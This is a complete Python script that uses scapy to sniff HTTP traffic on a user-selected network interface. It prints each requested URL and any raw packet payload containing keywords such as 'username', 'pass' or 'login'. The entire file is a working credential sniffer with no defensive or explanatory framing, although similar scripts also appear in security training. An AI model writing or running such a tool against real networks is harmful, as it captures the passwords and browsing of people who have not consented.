#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import click
import psutil


addrs = psutil.net_if_addrs()
addrs = addrs.keys()


@click.command()
@click.option("-i", "--interface", prompt=True, type=click.Choice(addrs))
def sniff(interface):
    print("Sniffing on: " + interface)
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["uname", "username", "user", "pass", "password", "login"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print(login_info)


if __name__ == "__main__":
    sniff()
